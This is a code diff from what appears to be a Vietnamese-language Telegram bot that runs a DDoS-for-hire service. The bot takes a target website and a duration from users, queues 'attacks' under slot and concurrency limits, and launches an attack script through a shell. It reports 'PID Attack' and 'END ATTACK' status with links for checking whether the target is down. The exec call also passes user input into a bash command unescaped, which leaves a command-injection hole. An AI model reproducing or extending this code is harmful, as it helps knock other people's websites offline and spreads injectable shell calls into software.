@@ -21,9 +21,9 @@ const du=Math.min(parseInt(t),L.maxTime);
 if([...x.values()].filter(v=>v.u===u).length>=L.slot)return bot.sendMessage(c,`❌ Giới hạn ${L.slot} tiến trình`,{parse_mode:'HTML'});
 if(x.size>=L.concurrent){q.push({u,h,t:du,c,cl});return bot.sendMessage(c,'⏳ Đang chờ...',{parse_mode:'HTML'});}
 const pid=Math.floor(Math.random()*9000+1000);x.set(pid,{u,h,du,c,cl});
-bot.sendMessage(c,JSON.stringify({Status:"✨🚀🛸 Successfully 🛸🚀✨",Caller:"@"+cl,"PID Attack":pid,Website:h,Time:`${du} Giây`,Maxslot:L.slot,Maxtime:L.maxTime,Methods:m,ConcurrentAttacks:x.size,StartTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'🔍 Check Host',url:`https://check-host.net/check-http?host=${h}`},{text:'🌐 Host Tracker',url:`https://www.host-tracker.com/en/ic/check-http?url=${h}`}]]}});
+bot.sendMessage(c,JSON.stringify({Status:"✨🚀🛸 Successfully 🛸🚀✨",Caller:cl,"PID Attack":pid,Website:h,Time:`${du} Giây`,Maxslot:L.slot,Maxtime:L.maxTime,Methods:m,ConcurrentAttacks:x.size,StartTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'🔍 Check Host',url:`https://check-host.net/check-http?host=${h}`},{text:'🌐 Host Tracker',url:`https://www.host-tracker.com/en/ic/check-http?url=${h}`}]]}});
 exec(`./${C.script} "${h}" "${du}"`,{shell:'/bin/bash'},(e,o,er)=>{if(e)return;
-bot.sendMessage(c,JSON.stringify({Status:"👽 END ATTACK 👽",Caller:"@"+cl,"PID Attack":pid,Website:h,Methods:m,Time:`${du} Giây`,EndTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML'});
+bot.sendMessage(c,JSON.stringify({Status:"👽 END ATTACK 👽",Caller:cl,"PID Attack":pid,Website:h,Methods:m,Time:`${du} Giây`,EndTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML'});x.delete(pid);
 if(q.length&&x.size<L.concurrent){const n=q.shift();bot.sendMessage(n.c,`📥 Bắt đầu: ${n.h} ${n.t}s`);bot.emit('message',{chat:{id:n.c},from:{id:n.u,username:n.cl},text:`${n.h} ${n.t}`});}});return;}
 if(!ad)return;
 if(text.startsWith('/pkill')){exec('pkill -9 -f "node.*\\.js"',(e,o,er)=>{if(e)return;bot.sendMessage(c,'✅ Đã dừng tất cả tiến trình',{parse_mode:'HTML'});x.clear();q=[];});return;}
